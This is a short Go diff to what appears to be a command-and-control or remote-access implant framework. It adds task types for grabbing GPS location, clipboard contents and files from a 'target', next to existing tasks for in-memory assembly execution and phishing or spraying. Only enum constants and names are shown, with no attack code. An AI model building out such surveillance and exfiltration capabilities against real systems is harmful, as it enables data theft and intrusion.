@@ -42,6 +42,9 @@ const (
 	TaskAssembly    uint8 = 26  // .NET assembly execution (in-memory)
 	TaskInitAccess  uint8 = 27  // Initial access commands (phish, spray, exploit)
 	TaskIfconfig    uint8 = 28  // Network interface information
+	TaskLocation    uint8 = 29  // GPS location
+	TaskClipboard   uint8 = 30  // Clipboard contents
+	TaskFileGet     uint8 = 31  // Download file from target
 )
 
 // Task status
@@ -118,6 +121,12 @@ func TaskTypeName(t uint8) string {
 		return "initaccess"
 	case TaskIfconfig:
 		return "ifconfig"
+	case TaskLocation:
+		return "location"
+	case TaskClipboard:
+		return "clipboard"
+	case TaskFileGet:
+		return "fileget"
 	default:
 		return "unknown"
 	}
